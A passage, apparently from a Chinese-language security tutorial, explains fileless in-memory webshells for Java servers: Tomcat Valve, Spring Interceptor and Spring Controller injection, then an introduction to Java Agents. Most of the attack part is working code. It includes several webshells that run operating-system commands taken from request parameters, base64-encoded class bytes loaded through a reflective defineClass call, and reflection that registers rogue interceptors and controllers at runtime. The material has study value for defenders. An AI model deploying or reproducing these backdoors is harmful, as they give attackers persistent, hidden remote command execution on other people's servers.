basic，它始终位于末端（最后执行），它在业务上面的表现是封装了具体的请求处理和输出响应。\nPipeline 提供了 addValve 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。\n\n简单理解也就是和 Filter 当中差不多，我们可以在 Filter Chain 当中任意添加 Filter；那么 Valve 也就是可以在 Pipline 当中任意添加。\n\n下面是 Pipeline 发挥功能的原理图\n\n攻击的大概思路\n\n先获取 StandardContext\n编写恶意 Valve\n通过 StandardContext.getPipeline().addValve() 添加恶意 Valve\n\n\nValve 型内存马应该在 Servlet 处被加载, 因为在 Servlet 内存马中的 HTTP11Processor 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic\n\n\n简单示例class ValveShell extends ValveBase&#123;    @Override  public void invoke(Request request, Response response) throws IOException, ServletException &#123;        System.out.println(&quot;111&quot;);         try &#123;              Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));         &#125; catch (Exception e) &#123;        &#125;    &#125;  &#125;\n\nSpring反射实现时用的webshell\njavapackage org.qi4l.memshell.spring.controller;import sun.misc.BASE64Decoder;import java.io.IOException;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class DynamicUtils &#123;\tpublic static String CONTROLLER_CLASS_STRING = &quot;yv66vgAAADQALQoABgAeCwAfACAIACEKACIAIwcAJAcAJQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTG9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0Q29udHJvbGxlcjsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAKRXhjZXB0aW9ucwcAJgEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL0dldE1hcHBpbmc7AQAKU291cmNlRmlsZQEAE1Rlc3RDb250cm9sbGVyLmphdmEBACtMb3JnL3NwcmluZ2ZyYW1ld29yay9zdGVyZW90eXBlL0NvbnRyb2xsZXI7AQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABS9zdTE4DAAHAAgHACcMACgAKQEADXN1MTggaXMgaGVyZX4HACoMACsALAEALW9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAACAAEABwAIAAEACQAAAC8AAQABAAAABSq3AAGxAAAAAgAKAAAABgABAAAAEQALAAAADAABAAAABQAMAA0AAAABAA4ADwADAAkAAABOAAIAAwAAAAwsuQACAQASA7YABLEAAAACAAoAAAAKAAIAAAAVAAsAFgALAAAAIAADAAAADAAMAA0AAAAAAAwAEAARAAEAAAAMABIAEwACABQAAAAEAAEAFQAWAAAABgABABcAAAACABgAAAACABkAFgAAABIAAgAaAAAAGwABABxbAAFzAB0=&quot;;\tpublic static String INTERCEPTOR_CLASS_STRING = &quot;yv66vgAAADQAKwoABgAbCwAcAB0IAB4KAB8AIAcAIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTG9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0SW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAKRXhjZXB0aW9ucwcAJAEAClNvdXJjZUZpbGUBABRUZXN0SW50ZXJjZXB0b3IuamF2YQwACAAJBwAlDAAmACcBABBpJ20gaW50ZXJjZXB0b3J+BwAoDAApACoBAC5vcmcvc3UxOC9tZW1zaGVsbC9zcHJpbmcvb3RoZXIvVGVzdEludGVyY2VwdG9yAQAQamF2YS9sYW5nL09iamVjdAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAACAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAACwAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAABZAAIABAAAAA0suQACAQASA7YABASsAAAAAgALAAAACgACAAAADwALABAADAAAACoABAAAAA0ADQAOAAAAAAANABEAEgABAAAADQATABQAAgAAAA0AFQAWAAMAFwAAAAQAAQAYAAEAGQAAAAIAGg==&quot;;\tpublic static Class&lt;?&gt; getClass(String classCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException &#123;\t\tClassLoader   loader        = Thread.currentThread().getContextClassLoader();\t\tBASE64Decoder base64Decoder = new BASE64Decoder();\t\tbyte[]        bytes         = base64Decoder.decodeBuffer(classCode);\t\tMethod   method = null;\t\tClass&lt;?&gt; clz    = loader.getClass();\t\twhile (method == null &amp;&amp; clz != Object.class) &#123;\t\t\ttry &#123;\t\t\t\tmethod = clz.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);\t\t\t&#125; catch (NoSuchMethodException ex) &#123;\t\t\t\tclz = clz.getSuperclass();\t\t\t&#125;\t\t&#125;\t\tif (method != null) &#123;\t\t\tmethod.setAccessible(true);\t\t\treturn (Class&lt;?&gt;) method.invoke(loader, bytes, 0, bytes.length);\t\t&#125;\t\treturn null;\t&#125;&#125;\n\nSpring Interceptor 内存马这里的描述的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的另一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦截器进行研究。Intercepor 主要是针对 Controller 进行拦截。\nIntercepor 是在什么时候调用的呢？又配置储存在哪呢？这部分比较简单，直接用文字来描述一下这个过程：\n\nSpring MVC 使用 DispatcherServlet 的 doDispatch 方法进入自己的处理逻辑；\n通过 getHandler 方法，循环遍历 handlerMappings 属性，匹配获取本次请求的 HandlerMapping；\n通过 HandlerMapping 的 getHandler 方法，遍历 this.adaptedInterceptors 中的所有 HandlerInterceptor 类实例，加入到 HandlerExecutionChain 的 interceptorList 中；\n调用 HandlerExecutionChain 的 applyPreHandle 方法，遍历其中的 HandlerInterceptor 实例并调用其 preHandle 方法执行拦截器逻辑。\n通过这次流程我们就清晰了，拦截器本身需要是 HandlerInterceptor 实例，储存在 AbstractHandlerMapping 的 adaptedInterceptors 中。写入非常简单，直接上例子。\n\n这种类型的场景：最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们 webshell 逻辑的处理。在 tomcat 容器下，有 filter、listener 等技术可以达到上述要求。那么在 spring 框架层面下，就考虑Interceptor 拦截了\n获得当前代码运行时的上下文环境参考基于内存 Webshell 的无文件攻击技术研究中的方法\n获取 adaptedInterceptors 属性值javaorg.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(&quot;requestMappingHandlerMapping&quot;);java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);field.setAccessible(true);java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);\n\n恶意Interceptor类结合漏洞（如反序列化、JNDI注入等）注入\njava//package bitterz.interceptors;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class TestInterceptor extends HandlerInterceptorAdapter &#123;    public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException &#123;        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);        field.setAccessible(true);        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);        // 避免重复添加        for (int i = adaptedInterceptors.size() - 1; i &gt; 0; i--) &#123;            if (adaptedInterceptors.get(i) instanceof TestInterceptor) &#123;                System.out.println(&quot;已经添加过TestInterceptor实例了&quot;);                return;            &#125;        &#125;        TestInterceptor aaa = new TestInterceptor(&quot;aaa&quot;);  // 避免进入实例创建的死循环        adaptedInterceptors.add(aaa);  //  添加全局interceptor    &#125;    private TestInterceptor(String aaa)&#123;&#125;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String code = request.getParameter(&quot;code&quot;);        if (code != null) &#123;            java.lang.Runtime.getRuntime().exec(code);            return true;        &#125;        else &#123;//            response.sendError(404);            return true;        &#125;&#125;&#125;\n\n反射实现如下：\njavapackage org.qi4l.memshell.spring.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.servlet.support.RequestContextUtils;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.lang.reflect.Field;import java.util.List;import static org.qi4l.memshell.spring.controller.DynamicUtils.INTERCEPTOR_CLASS_STRING;/** * 访问此接口动态添加 Interceptor * * @author qi4l */@Controller@RequestMapping(value = &quot;/addInterceptor&quot;)public class AddInterceptor &#123;\t@GetMapping()\tpublic void index(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;\t\t// 获取当前应用上下文\t\tWebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());\t\t// 通过 context 获取 RequestMappingHandlerMapping 对象\t\tRequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);\t\tField f = mapping.getClass().getSuperclass().getDeclaredField(&quot;adaptedInterceptors&quot;);\t\tf.setAccessible(true);\t\tList&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) f.get(mapping);\t\tlist.add((HandlerInterceptor) DynamicUtils.getClass(INTERCEPTOR_CLASS_STRING).newInstance());\t\tresponse.getWriter().println(&quot;interceptor added&quot;);\t&#125;&#125;\n\nSpring Controller 内存马Servlet 能做内存马，Controller 当然也能做，不过 SpringMVC 可以在运行时动态添加 Controller 吗？答案是肯定的。在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping，在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。这里使用 spring-webmvc-5.2.3 进行调试。\n所谓 Spring Controller 的动态注册，就是对 RequestMappingHandlerMapping 注入的过程，如果你对 SpringMVC 比较了解，可以直接看这篇文章然后再看我的注入代码，如果比较关注整个流程，可以接着向下看。\n首先来看两个类：\n\nRequestMappingInfo：一个封装类，对一次 http 请求中的相关信息进行封装。\nHandlerMethod：对 Controller 的处理请求方法的封装，里面包含了该方法所属的 bean、method、参数等对象。\n\nSpringMVC 初始化时，在每个容器的 bean 构造方法、属性设置之后，将会使用 InitializingBean 的 afterPropertiesSet 方法进行 Bean 的初始化操作，其中实现类 RequestMappingHandlerMapping 用来处理具有 @Controller 注解类中的方法级别的 @RequestMapping 以及 RequestMappingInfo 实例的创建。看一下具体的是怎么创建的。\n它的 afterPropertiesSet 方法初始化了 RequestMappingInfo.BuilderConfiguration 这个配置类，然后调用了其父类 AbstractHandlerMethodMapping 的 afterPropertiesSet 方法。\n\n这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 processCandidateBean 方法处理 Bean。\n\nprocessCandidateBean 方法\n\nisHandler 方法判断当前 bean 定义是否带有 Controller 或 RequestMapping 注解。\n\ndetectHandlerMethods 查找 handler methods 并注册。\n\n这部分有两个关键功能，一个是 getMappingForMethod 方法根据 handler method 创建RequestMappingInfo 对象，一个是 registerHandlerMethod 方法将 handler method 与访问的 创建 RequestMappingInfo 进行相关映射。\n\n这里我们看到，是调用了 MappingRegistry 的 register 方法，这个方法将一些关键信息进行包装、处理和储存。\n\n关键信息储存位置如下：\n\n以上就是整个注册流程，那当一次请求进来时的查找流程呢？在 AbstractHandlerMethodMapping 的 lookupHandlerMethod 方法：\n\n在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos\n如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos\n获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod\n\n上述的流程和较详细的流程描述在这篇文章中可以查看，由于我这里使用的版本与之不同，所以一些代码和细节可能不同。\n那接下来就是动态注册 Controller 了，LandGrey 师傅在他的文章中列举了几种可用来添加的接口，其实本章上都是调用之前我们提到的 MappingRegistry 的 register 方法。\n和 Servlet 的添加较为类似的是，重点需要添加的就是访问 url 与 RequestMappingInfo 的映射，以及是 RequestMappingInfo 与 HandlerMethod 的映射。\n这里也可以不使用 LandGrey 师傅提到的接口，而是直接使用 MappingRegistry 的 register 方法来添加，当然，同样可以通过自己实现逻辑，通过反射直接写进重要位置，不使用 Spring 提供的接口。\n具体实现如下：\n这里在强调一下，不需要强制使用 @RequestMapping 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用@RequestMapping 注解 。\n除此之外，将 Webshell 的代码逻辑写在主要的 Controller 方法中即可\njavapackage me.landgrey;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.PrintWriter;@Controllerpublic class SSOLogin &#123;    @RequestMapping(value = &quot;/favicon&quot;)    public void login(HttpServletRequest request, HttpServletResponse response)&#123;        try &#123;            String arg0 = request.getParameter(&quot;code&quot;);            PrintWriter writer = response.getWriter();            if (arg0 != null) &#123;                String o = &quot;&quot;;                java.lang.ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);                &#125;else&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;else&#123;                response.sendError(404);            &#125;        &#125;catch (Exception e)&#123;        &#125;    &#125;&#125;\n\n反射实现如下：\njavapackage org.qi4l.memshell.spring.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.servlet.support.RequestContextUtils;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Map;import static org.qi4l.memshell.spring.controller.DynamicUtils.CONTROLLER_CLASS_STRING;/** * 访问此接口动态添加 controller * * @author qi4l */@Controller@RequestMapping(value = &quot;/add&quot;)public class AddController &#123;\t@GetMapping()\tpublic void index(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;\t\tfinal String controllerPath = &quot;/qi4l&quot;;\t\t// 获取当前应用上下文\t\tWebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());\t\t// 通过 context 获取 RequestMappingHandlerMapping 对象\t\tRequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);\t\t// 获取父类的 MappingRegistry 属性\t\tField f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;mappingRegistry&quot;);\t\tf.setAccessible(true);\t\tObject mappingRegistry = f.get(mapping);\t\t// 反射调用 MappingRegistry 的 register 方法\t\tClass&lt;?&gt; c = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;);\t\tMethod[] ms = c.getDeclaredMethods();\t\t// 判断当前路径是否已经添加\t\tField field = c.getDeclaredField(&quot;urlLookup&quot;);\t\tfield.setAccessible(true);\t\tMap&lt;String, Object&gt; urlLookup = (Map&lt;String, Object&gt;) field.get(mappingRegistry);\t\tfor (String urlPath : urlLookup.keySet()) &#123;\t\t\tif (controllerPath.equals(urlPath)) &#123;\t\t\t\tresponse.getWriter().println(&quot;controller url path exist already&quot;);\t\t\t\treturn;\t\t\t&#125;\t\t&#125;\t\t// 初始化一些注册需要的信息\t\tPatternsRequestCondition       url       = new PatternsRequestCondition(controllerPath);\t\tRequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();\t\tRequestMappingInfo             info      = new RequestMappingInfo(url, condition, null, null, null, null, null);\t\tClass&lt;?&gt; myClass = DynamicUtils.getClass(CONTROLLER_CLASS_STRING);\t\tfor (Method method : ms) &#123;\t\t\tif (&quot;register&quot;.equals(method.getName())) &#123;\t\t\t\t// 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index\t\t\t\tmethod.setAccessible(true);\t\t\t\tmethod.invoke(mappingRegistry, info, myClass.newInstance(), myClass.getMethods()[0]);\t\t\t\tresponse.getWriter().println(&quot;spring controller add&quot;);\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n\nJava Agent 内存马概述我们知道Java是一种强类型语言，在运行之前必须将其编译成.class字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。\n实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？\n对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图\n\n\nJava Agent示例premain-Agent我们首先来实现一个简单的premain-Agent，创建一个Maven项目，编写一个简单的premain-Agent\njavapackage com.java.premain.agent; import java.lang.instrument.Instrumentation; public class Java_Agent_premain &#123;    public static void premain(String args, Instrumentation inst) &#123;        for (int i =0 ; i&lt;10 ; i++)&#123;            System.out.println(&quot;调用了premain-Agent！&quot;);        &#125;    &#125;&#125;\n\n接着在resource&#x2F;META-INF&#x2F;下创建MANIFEST.MF清单文件用以指定premain-Agent的启动类\nManifest-Version: 1.0Premain-Class: com.java.premain.agent.Java_Agent_premain\n\n将其打包成jar文件\n\n创建一个目标类\npublic class Hello &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;\n\n添加JVM Options（注意分号之后不能有空格）\n-javaagent:&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;\n\nagentmain-Agent相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。\nVirtualMachine类com.sun.tools.attach.VirtualMachine类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。\n该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法\n//允许我们传入一个JVM的PID，然后远程连接到该JVM上VirtualMachine.attach() //向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理VirtualMachine.loadAgent() //获得当前所有的JVM列表VirtualMachine.list() //解除与特定JVM的连接VirtualMachine.detach()\n\nVirtualMachineDescriptor类com.sun.tools.attach.VirtualMachineDescriptor 类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例\njavaimport com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor; import java.util.List; public class get_PID &#123;    public static void main(String[] args) &#123;                //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;                        //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID            if(vmd.displayName().equals(&quot;get_PID&quot;))            System.out.println(vmd.id());        &#125;     &#125;&#125;  ##4908 Process finished with exit code 0\n\n下面我们就来实现一个 agentmain-Agent 。首先我们编写一个Sleep_Hello类，模拟正在运行的JVM\nimport static java.lang.Thread.sleep; public class Sleep_Hello &#123;    public static void main(String[] args) throws InterruptedException &#123;        while (true)&#123;            System.out.println(&quot;Hello World!&quot;);            sleep(5000);        &#125;    &#125;&#125;\n\n然后编写我们的 agentmain-Agent 类\njavapackage com.java.agentmain.agent; import java.lang.instrument.Instrumentation; import static java.lang.Thread.sleep; public class Java_Agent_agentmain &#123;    public static void agentmain(String args, Instrumentation inst) throws InterruptedException &#123;        while (true)&#123;            System.out.println(&quot;调用了agentmain-Agent!&quot;);            sleep(3000);        &#125;    &#125;&#125;\n\n同时配置MANIFEST.MF文件\njavaManifest-Version: 1.0Agent-Class: com.java.agentmain.agent.Java_Agent_agentmain\n\n编译打包成jar文件 out/artifacts/Java_Agent_jar/Java_Agent.jar\n最后编写一个Inject_Agent类，获取特定JVM的PID并注入Agent\njavapackage com.java.inject; import com.sun.tools.attach.*; import java.io.IOException;import java.util.List; public class Inject_Agent &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;             //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent            if(vmd.displayName().equals(&quot;Sleep_Hello&quot;))&#123;                 //连接指定JVM                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());                //加载Agent                virtualMachine.loadAgent(&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;);                //断开JVM连接                virtualMachine.detach();            &#125;         &#125;    &#125;&#125;\n\n首先启动Sleep_Hello目标JVM\n然后运行Inject_Agent类，注入Agent\nInstrumentationInstrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。\n其在Java中是一个接口，常用方法如下\njavapublic interface Instrumentation &#123;        //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);     //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);     //删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);      //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;       //判断一个类是否被修改    boolean isModifiableClass(Class&lt;?&gt; theClass);     // 获取目标已经加载的类。    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();     //获取一个对象的大小    long getObjectSize(Object objectToSize); &#125;\n\n获取目标JVM已加载类下面我们简单实现一个能够获取目标JVM已加载类的agentmain-Agent\njavapackage com.java.agentmain.instrumentation; import java.lang.instrument.Instrumentation; public class Java_Agent_agentmain_Instrumentation &#123;    public static void agentmain(String args, Instrumentation inst) throws InterruptedException &#123;        Class [] classes = inst.getAllLoadedClasses();         for(Class cls : classes)&#123;            System.out.println(&quot;------------------------------------------&quot;);            System.out.println(&quot;加载类: &quot;+cls.getName());            System.out.println(&quot;是否可被修改: &quot;+inst.isModifiableClass(cls));        &#125;    &#125;&#125;\n\n注入目标进程，结果如下\nHello World!Hello World!------------------------------------------加载类: com.java.agentmain.instrumentation.Java_Agent_agentmain_Instrumentation是否可被修改: true------------------------------------------加载类: Sleep_Hello是否可被修改: true------------------------------------------加载类: com.intellij.rt.execution.application.AppMainV2$1是否可被修改: true------------------------------------------加载类: com.intellij.rt.execution.application.AppMainV2是否可被修改: true------------------------------------------加载类: com.intellij.rt.execution.application.AppMainV2$Agent是否可被修改: true ...\n\ntransform在Instrumentation接口中，我们可以通过 addTransformer() 来添加一个transformer（转换器），关键属性就是 ClassFileTransformer 类。\n//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);\n\nClassFileTransformer接口中只有一个 transform() 方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。\npublic interface ClassFileTransformer &#123;     /**     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息     *     * @param loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null     * @param className           完全限定类内部形式的类名称,格式如:java/lang/Runtime     * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null     * @param protectionDomain    要定义或重定义的类的保护域     * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）     * @return 返回一个通过ASM修改后添加了防御代码的字节码byte数组。     */        byte[] transform(  ClassLoader         loader,                String              className,                Class&lt;?&gt;            classBeingRedefined,                ProtectionDomain    protectionDomain,                byte[]              classfileBuffer)        throws IllegalClassFormatException;&#125;\n\n在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过 ClassLoader.defineClass 加载进来的类。而重定义是通过Instrumentation.redefineClasses 方法重定义的类。\n当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。\n转换将按以下顺序应用：\n\n不可重转换转换器\n\n不可重转换本机转换器\n\n可重转换转换器\n\n可重转换本机转换器\n\n至于transformer中对字节码的具体操作，则需要使用到Javassisit类。下面我就来修改一个正在运行JVM的字节码。\n\n\n修改目标JVM的Class字节码首先编写一个目标类 com.sleep.hello.Sleep_Hello.java\njavapackage com.sleep.hello; import static java.lang.Thread.sleep; public class Sleep_Hello &#123;    public static void main(String[] args) throws InterruptedException &#123;        while (true)&#123;            hello();            sleep(3000);        &#125;    &#125;     public static void hello()&#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;\n\n编写一个 agentmain-Agent\njavapackage com.java.agentmain.instrumentation.transformer; import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException; public class Java_Agent_agentmain_transform &#123;    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, 